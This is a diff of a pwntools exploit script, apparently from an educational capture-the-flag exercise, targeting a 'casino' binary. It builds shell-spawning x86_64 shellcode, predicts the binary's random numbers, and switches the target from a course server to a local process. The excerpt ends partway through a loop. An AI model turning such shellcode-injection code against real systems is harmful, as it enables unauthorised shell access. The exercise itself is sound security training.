@@ -2,11 +2,10 @@ from pwn import *
 
 # shellcode
 context.clear(arch='x86_64')
-# sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
+sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
 sc = asm(shellcraft.sh())
 name_all = b'A' * 0x10 + sc
 
-# r = process("./casino")
 # random number
 p = process("./gen_num.out")
 numbers = p.recvall().decode().split('\n') # prevent bytes object is required not str error
@@ -15,8 +14,12 @@ p.close()
 
 
 # send
-r = remote('edu-ctf.csie.org', 10172)
-r.sendlineafter('name: ', 'AAAAAA')
+r = process("./casino")
+elf = ELF("./casino")
+print(elf.got)
+print(elf.got['puts'])
+# r = remote('edu-ctf.csie.org', 10172)
+r.sendlineafter('name: ', 'AAAAAAAAAAAAAA') # 15 is the limit, no overflow for this
 r.sendlineafter('age: ', '40')
 
 for cnt_try in range(0, 2):
